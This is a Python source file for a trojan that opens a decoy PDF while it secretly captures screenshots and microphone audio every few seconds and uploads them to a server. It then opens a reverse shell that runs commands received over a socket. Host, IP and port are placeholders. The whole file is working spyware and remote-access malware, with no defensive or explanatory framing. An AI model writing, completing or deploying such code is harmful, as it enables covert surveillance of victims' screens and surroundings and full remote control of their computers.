import subprocess
import os
import socket
import shlex
import threading
import sys
import webbrowser
import pyautogui
from io import BytesIO
import requests
import time
import sounddevice as sd
from scipy.io.wavfile import write
SERVER_URL = "http://127.0.0.1:2020"
SAMPLE_RATE = 44100
DURATION = 3
def open_pdf():
    print("Open pdf in webborwser....")
    if hasattr(sys, "_MEIPASS"):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(__file__)
    pdf_path = os.path.join(base_path, "Fake.pdf")
    webbrowser.open(pdf_path)
def spy():
    while True:
        screenshot = pyautogui.screenshot()
        buffer = BytesIO()
        screenshot.save(buffer,format="png")
        buffer.seek(0)
        pictures_files={
            "image": ("screenshot.png", buffer, "image/png")
        }
        recording = sd.rec(int(DURATION * SAMPLE_RATE),samplerate=SAMPLE_RATE,channels=1,dtype="int16")
        sd.wait()
        buffer = BytesIO()
        write(buffer, SAMPLE_RATE, recording)
        buffer.seek(0)
        recording_files = {
            "audio": ("audio.wav", buffer, "audio/wav")
        }
        try:
            requests.post(SERVER_URL+"/upload-picture",files=pictures_files)
            requests.post(SERVER_URL+"/upload-audio",files=recording_files)
        except Exception as e:
            print("\n")
        time.sleep(3)
def connect_back():
    s = socket.socket()
    s.connect(("IP", "PORT"))
    while True:
        try:
            cmd = s.recv(1024).decode("utf-8").strip()
            if not cmd:
                continue
            if cmd.lower() == "exit":
                break
            if cmd.lower().startswith("cd"):
                try:
                    parts = shlex.split(cmd)
                    if len(parts) > 1:
                        os.chdir(parts[1])
                    s.send(f"{os.getcwd()}\n".encode())
                except Exception as e:
                    s.send(f"[-] {e}\n".encode())
                continue
            output = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True
            )
            result = output.stdout + output.stderr
            if result:
                s.send(result.encode())
        except Exception as e:
            s.send(f"[-] Error: {e}\n".encode())
    s.close()
threading.Thread(target=open_pdf).start()
threading.Thread(target=spy,daemon=True).start()
connect_back()